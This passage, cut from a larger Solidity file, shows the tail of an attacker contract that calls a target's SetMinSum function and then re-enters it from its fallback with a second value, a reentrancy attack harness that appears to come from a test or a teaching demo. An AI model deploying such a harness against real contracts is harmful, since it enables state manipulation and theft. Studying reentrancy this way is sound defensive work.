    uint256 public reentrantValue;

    constructor(C _target, uint256 _v2) {
        target = _target;
        reentrantValue = _v2;
    }

    function attack(uint256 v1) external {
        target.SetMinSum(v1);
    }

    fallback() external payable {
        // Re-enter via SetMinSum with a different value.
        target.SetMinSum(reentrantValue);
    }
}

